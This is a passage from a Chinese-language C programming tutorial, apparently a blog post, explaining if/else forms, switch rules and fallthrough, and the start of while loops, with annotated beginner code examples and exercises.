<pre><code class="hljs c"><span class="hljs-keyword">if</span>(表达式)&#123;
  语句块<span class="hljs-number">1</span>;
&#125;<span class="hljs-keyword">else</span>&#123;
  语句块<span class="hljs-number">2</span>;
&#125;
后续语句;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(age &gt; <span class="hljs-number">18</span>)&#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开网卡\n&quot;</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;喊家长来开\n&quot;</span>);
&#125;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;买烟\n&quot;</span>);</code></pre>
<ul>
<li>if第三种形式
<ul>
<li>如果&quot;表达式1&quot;为真,则执行&quot;语句块1&quot;,否则判断&quot;表达式2&quot;,如果为真执行&quot;语句块2&quot;,否则再判断&quot;表达式3&quot;,如果真执行&quot;语句块3&quot;, 当表达式1、2、3都不满足,会执行最后一个else语句</li>
<li>众多大括号中,只有一个大括号中的内容会被执行</li>
<li>只有前面所有添加都不满足, 才会执行else大括号中的内容</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(表达式<span class="hljs-number">1</span>) &#123;
  语句块<span class="hljs-number">1</span>;
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(表达式<span class="hljs-number">2</span>)&#123;
  语句块<span class="hljs-number">2</span>;
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(表达式<span class="hljs-number">3</span>)&#123;
  语句块<span class="hljs-number">3</span>;
&#125;<span class="hljs-keyword">else</span>&#123;
  语句块<span class="hljs-number">4</span>;
&#125;
后续语句;
</code></pre>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(age&gt;<span class="hljs-number">40</span>)&#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;给房卡&quot;</span>);
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(age&gt;<span class="hljs-number">25</span>)&#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;给名片&quot;</span>);
&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(age&gt;<span class="hljs-number">18</span>)&#123;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;给网卡&quot;</span>);
&#125;<span class="hljs-keyword">else</span>&#123;
  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;给好人卡&quot;</span>);
&#125;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;买烟\n&quot;</span>);
</code></pre>
<ul>
<li>if嵌套
<ul>
<li>if中可以继续嵌套if, else中也可以继续嵌套if</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">if</span>(表达式<span class="hljs-number">1</span>)&#123;
    语句块<span class="hljs-number">1</span>;
   <span class="hljs-keyword">if</span>(表达式<span class="hljs-number">2</span>)&#123;
      语句块<span class="hljs-number">2</span>;
  &#125;
&#125;<span class="hljs-keyword">else</span>&#123;
   <span class="hljs-keyword">if</span>(表达式<span class="hljs-number">3</span>)&#123;
      语句块<span class="hljs-number">3</span>;
  &#125;<span class="hljs-keyword">else</span>&#123;
      语句块<span class="hljs-number">4</span>;
  &#125;
&#125;
</code></pre>
<ul>
<li><strong>if注意点</strong>
<ul>
<li>任何数值都有真假性</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;
int main()&#123;
    if(0)&#123;
        printf(&quot;执行了if&quot;);
    &#125;else&#123;
        printf(&quot;执行了else&quot;); // 被执行
    &#125;
&#125;
</code></pre>
<ul>
<li>当if else后面只有一条语句时, if else后面的大括号可以省略</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 极其不推荐写法</span>
<span class="hljs-type">int</span> age = <span class="hljs-number">17</span>;
<span class="hljs-keyword">if</span> (age &gt;= <span class="hljs-number">18</span>)
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;开网卡\n&quot;</span>);
<span class="hljs-keyword">else</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;喊家长来开\n&quot;</span>);
</code></pre>
<ul>
<li>当if else后面的大括号被省略时, else会自动和距离最近的一个if匹配</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>)
    <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;A\n&quot;</span>);
    <span class="hljs-keyword">else</span> <span class="hljs-comment">// 和if(1)匹配</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;B\n&quot;</span>);
    <span class="hljs-keyword">else</span> <span class="hljs-comment">// 和if(0)匹配, 因为if(1)已经被匹配过了</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-number">1</span>)
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;C\n&quot;</span>); <span class="hljs-comment">// 输出C</span>
    <span class="hljs-keyword">else</span> <span class="hljs-comment">// 和if(1)匹配</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;D\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li>如果if else省略了大括号, 那么后面不能定义变量</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>)
        <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>; <span class="hljs-comment">// 系统会报错</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;number = %i\n&quot;</span>, number);
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-number">0</span>)&#123;
        <span class="hljs-type">int</span> number = <span class="hljs-number">10</span>; 
    &#125;<span class="hljs-keyword">else</span>
        <span class="hljs-type">int</span> value = <span class="hljs-number">20</span>; <span class="hljs-comment">// 系统会报错</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;value = %i\n&quot;</span>, value);
&#125;
</code></pre>
<ul>
<li>C语言中分号(;)也是一条语句, 称之为空语句</li>
</ul>
<pre><code class="hljs c"><span class="hljs-comment">// 因为if(10 &gt; 2)后面有一个分号, 所以系统会认为if省略了大括号</span>
<span class="hljs-comment">// if省略大括号时只能管控紧随其后的那条语句, 所以只能管控分号</span>
<span class="hljs-keyword">if</span>(<span class="hljs-number">10</span> &gt; <span class="hljs-number">2</span>);
&#123;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;10 &gt; 2&quot;</span>);
&#125;
<span class="hljs-comment">// 输出结果: 10 &gt; 2</span>
</code></pre>
<ul>
<li>但凡遇到比较一个变量等于或者不等于某一个常量的时候，把常量写在前面</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">8</span>;
<span class="hljs-comment">//    if(a = 10)&#123;// 错误写法, 但不会报错</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-number">10</span> == a)&#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a的值是10\n&quot;</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a的值不是10\n&quot;</span>);
    &#125;
&#125;
</code></pre>
<ul>
<li>if练习
<ul>
<li>从键盘输入一个整数，判断其是否是偶数，如果是偶数就输出YES，否则输出NO；</li>
<li>接收用户输入的1～7的整数，根据用户输入的整数，输出对应的星期几</li>
<li>接收用户输入的一个整数month代表月份，根据月份输出对应的季节</li>
<li>接收用户输入的两个整数，判断大小后输出较大的那个数</li>
<li>接收用户输入的三个整数，判断大小后输出较大的那个数</li>
<li>接收用户输入的三个整数，排序后输出</li>
</ul>
</li>
<li>实现石头剪刀布</li>
</ul>
<pre><code class="hljs c">剪刀石头布游戏:
<span class="hljs-number">1</span>)定义游戏规则
  剪刀 干掉 布
  石头 干掉 剪刀
  布 干掉石头
<span class="hljs-number">2</span>)显示玩家开始猜拳
<span class="hljs-number">3</span>)接收玩家输入的内容
<span class="hljs-number">4</span>)让电脑随机产生一种拳
<span class="hljs-number">5</span>)判断比较
(<span class="hljs-number">1</span>)玩家赢的情况(显示玩家赢了)
(<span class="hljs-number">2</span>)电脑赢的情况(显示电脑赢了)
(<span class="hljs-number">3</span>)平局(显示平局)
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/9675ed14d1f2cfdb6fa58752ae76d085.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/36f1d6ccc6c819247d0d7daa891bf792.png" alt="img"></p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/0e7fdb8da82053d56617f13c5e2dfc72.png" alt="img"></p>
<h2 id="选择结构switch">选择结构switch</h2>
<ul>
<li>由于 if else if 还是不够简洁，所以switch 就应运而生了，他跟 if else if 互为补充关系。switch 提供了点的多路选择</li>
<li>格式:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-keyword">switch</span>(表达式)&#123;
    <span class="hljs-keyword">case</span> 常量表达式<span class="hljs-number">1</span>:
        语句<span class="hljs-number">1</span>;
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> 常量表达式<span class="hljs-number">2</span>:
        语句<span class="hljs-number">2</span>; 
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> 常量表达式n:
        语句n;
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        语句n+<span class="hljs-number">1</span>;
        <span class="hljs-keyword">break</span>;
&#125;
</code></pre>
<ul>
<li>语义:
<ul>
<li>计算&quot;表达式&quot;的值, 逐个与其后的&quot;常量表达式&quot;值相比较,当&quot;表达式&quot;的值与某个&quot;常量表达式&quot;的值相等时, 即执行其后的语句, 然后跳出switch语句</li>
<li>如果&quot;表达式&quot;的值与所有case后的&quot;常量表达式&quot;均不相同时,则执行default后的语句</li>
</ul>
</li>
<li>示例:</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;

    <span class="hljs-type">int</span> num = <span class="hljs-number">3</span>;
    <span class="hljs-keyword">switch</span>(num)&#123;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期二\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期三\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期四\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期五\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期六\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期日\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>switch注意点
<ul>
<li>switch条件表达式的类型必须是整型, 或者可以被提升为整型的值(char、short)</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;

    <span class="hljs-keyword">switch</span>(<span class="hljs-number">1.1</span>)&#123; <span class="hljs-comment">// 报错</span>
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期二\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>+case的值只能是常量, 并且还必须是整型, 或者可以被提升为整型的值(char、short)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;

    <span class="hljs-type">int</span> num = <span class="hljs-number">3</span>;
    <span class="hljs-keyword">switch</span>(<span class="hljs-number">1</span>)&#123; 
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期二\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> num: <span class="hljs-comment">// 报错</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期三\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">4.0</span>: <span class="hljs-comment">// 报错</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期四\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>case后面常量表达式的值不能相同</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">switch</span>(<span class="hljs-number">1</span>)&#123; 
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// 报错</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">// 报错</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>case后面要想定义变量,必须给case加上大括号</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">switch</span>(<span class="hljs-number">1</span>)&#123;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:&#123;
        <span class="hljs-type">int</span> num = <span class="hljs-number">10</span>;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;num = %i\n&quot;</span>, num);
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
        &#125;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>switch中只要任意一个case匹配, 其它所有的case和default都会失效. 所以如果case和default后面没有break就会出现穿透问题</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;

    <span class="hljs-type">int</span> num = <span class="hljs-number">2</span>;
    <span class="hljs-keyword">switch</span>(num)&#123;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期二\n&quot;</span>); <span class="hljs-comment">// 被输出</span>
    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期三\n&quot;</span>); <span class="hljs-comment">// 被输出</span>
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;回火星去\n&quot;</span>); <span class="hljs-comment">// 被输出</span>
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>switch中default可以省略</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">switch</span>(<span class="hljs-number">1</span>)&#123;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>switch中default的位置不一定要写到最后, 无论放到哪都会等到所有case都不匹配才会执行(穿透问题除外)</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-keyword">switch</span>(<span class="hljs-number">3</span>)&#123;
    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">default</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Other,,,\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;星期一\n&quot;</span>);
        <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li><em><strong>if和Switch转换</strong></em></li>
<li>看上去if和switch都可以实现同样的功能, 那么在企业开发中我们什么时候使用if, 什么时候使用switch呢?
<ul>
<li>if else if 针对于范围的多路选择</li>
<li>switch 是针对点的多路选择</li>
</ul>
</li>
<li>判断用户输入的数据是否大于100</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">-1</span>;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);
    <span class="hljs-keyword">if</span>(a &gt; <span class="hljs-number">100</span>)&#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户输入的数据大于100&quot;</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;用户输入的数据不大于100&quot;</span>);
    &#125;
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>

<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;
    <span class="hljs-type">int</span> a = <span class="hljs-number">-1</span>;
    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;a);
    <span class="hljs-comment">// 挺(T)萌(M)的(D)搞不定啊</span>
    <span class="hljs-keyword">switch</span> (a) &#123;
        <span class="hljs-keyword">case</span> <span class="hljs-number">101</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-number">102</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-number">103</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-number">104</span>:
        <span class="hljs-keyword">case</span> <span class="hljs-number">105</span>:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;大于\n&quot;</span>);
            <span class="hljs-keyword">break</span>;
        <span class="hljs-keyword">default</span>:
            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;不大于\n&quot;</span>);
            <span class="hljs-keyword">break</span>;
    &#125;
&#125;
</code></pre>
<ul>
<li>练习
<ul>
<li>实现分数等级判定</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">要求用户输入一个分数，根据输入的分数输出对应的等级
A <span class="hljs-number">90</span>～<span class="hljs-number">100</span>  
B <span class="hljs-number">80</span>～<span class="hljs-number">89</span>
C <span class="hljs-number">70</span>～<span class="hljs-number">79</span>
D <span class="hljs-number">60</span>～<span class="hljs-number">69</span>
E <span class="hljs-number">0</span>～<span class="hljs-number">59</span>
</code></pre>
<ul>
<li>实现+ - * / 简单计算器</li>
</ul>
<h2 id="循环结构">循环结构</h2>
<ul>
<li>C语言中提供了三大循环结构, 分别是while、dowhile和for</li>
<li>循环结构是程序中一种很重要的结构。
<ul>
<li>其特点是,在给定条件成立时,反复执行某程序段, 直到条件不成立为止。</li>
<li>给定的条件称为&quot;循环条件&quot;,反复执行的程序段称为&quot;循环体&quot;<br>
<img src="https://img-blog.csdnimg.cn/img_convert/619c445bc05120b53fc65c3f9f18f647.png" alt="img"></li>
</ul>
</li>
</ul>
<h2 id="循环结构while">循环结构while</h2>
<ul>
<li>
<p>格式:</p>
<pre><code class="hljs c"><span class="hljs-keyword">while</span> (  循环控制条件 ) &#123;
    循环体中的语句;
    能够让循环结束的语句;
    ....
&#125;
</code></pre>
<ul>
<li>构成循环结构的几个条件
<ul>
<li>循环控制条件
<ul>
<li>循环退出的主要依据,来控制循环到底什么时候退出</li>
</ul>
</li>
<li>循环体
<ul>
<li>循环的过程中重复执行的代码段</li>
</ul>
</li>
<li>能够让循环结束的语句(递增、递减、真、假等)
<ul>
<li>能够让循环条件为假的依据,否则退出循环</li>
</ul>
</li>
</ul>
</li>
<li>示例:</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
<span class="hljs-keyword">while</span> (count &lt; <span class="hljs-number">3</span>) &#123; <span class="hljs-comment">// 循环控制条件</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); <span class="hljs-comment">// 需要反复执行的语句</span>
    count++; <span class="hljs-comment">// 能够让循环结束的语句</span>
&#125;
</code></pre>
<ul>
<li>while循环执行流程
<ul>
<li>首先会判定&quot;循环控制条件&quot;是否为真, 如果为假直接跳到循环语句后面</li>
<li>如果&quot;循环控制条件&quot;为真, 执行一次循环体, 然后再次判断&quot;循环控制条件&quot;是否为真, 为真继续执行循环体,为假跳出循环</li>
<li>重复以上操作, 直到&quot;循环控制条件&quot;为假为止</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> count = <span class="hljs-number">4</span>;
    <span class="hljs-comment">// 1.判断循环控制条件是否为真,此时为假所以跳过循环语句</span>
    <span class="hljs-keyword">while</span> (count &lt; <span class="hljs-number">3</span>) &#123; 
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); 
        count++; 
    &#125;
    <span class="hljs-comment">// 2.执行循环语句后面的代码, 打印&quot;循环执行完毕&quot;</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;循环执行完毕\n&quot;</span>);
&#125;
</code></pre>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;
    <span class="hljs-comment">// 1.判断循环控制条件是否为真,此时0 &lt; 3为真</span>
    <span class="hljs-comment">// 4.再次判断循环控制条件是否为真,此时1 &lt; 3为真</span>
    <span class="hljs-comment">// 7.再次判断循环控制条件是否为真,此时2 &lt; 3为真</span>
    <span class="hljs-comment">// 10.再次判断循环控制条件是否为真,此时3 &lt; 3为假, 跳过循环语句</span>
    <span class="hljs-keyword">while</span> (count &lt; <span class="hljs-number">3</span>) &#123; 
        <span class="hljs-comment">// 2.执行循环体中的代码, 打印&quot;发子弹&quot;</span>
        <span class="hljs-comment">// 5.执行循环体中的代码, 打印&quot;发子弹&quot;</span>
        <span class="hljs-comment">// 8.执行循环体中的代码, 打印&quot;发子弹&quot;</span>
        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>); 
        <span class="hljs-comment">// 3.执行&quot;能够让循环结束的语句&quot; count = 1</span>
        <span class="hljs-comment">// 6.执行&quot;能够让循环结束的语句&quot; count = 2</span>
        <span class="hljs-comment">// 9.执行&quot;能够让循环结束的语句&quot; count = 3</span>
        count++; 
    &#125;
    <span class="hljs-comment">// 11.执行循环语句后面的代码, 打印&quot;循环执行完毕&quot;</span>
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;循环执行完毕\n&quot;</span>);
&#125;
</code></pre>
<ul>
<li><strong>while循环注意点</strong>
<ul>
<li>任何数值都有真假性</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 死循环</span>
         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);
         <span class="hljs-comment">// 没有能够让循环结束的语句</span>
    &#125;
&#125;
</code></pre>
<ul>
<li>当while后面只有一条语句时,while后面的大括号可以省略</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)  <span class="hljs-comment">// 死循环</span>
         <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;发射子弹~哔哔哔哔\n&quot;</span>);
         <span class="hljs-comment">// 没有能够让循环结束的语句</span>
&#125;
</code></pre>
<ul>
<li>如果while省略了大括号, 那么后面不能定义变量</li>
</ul>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;
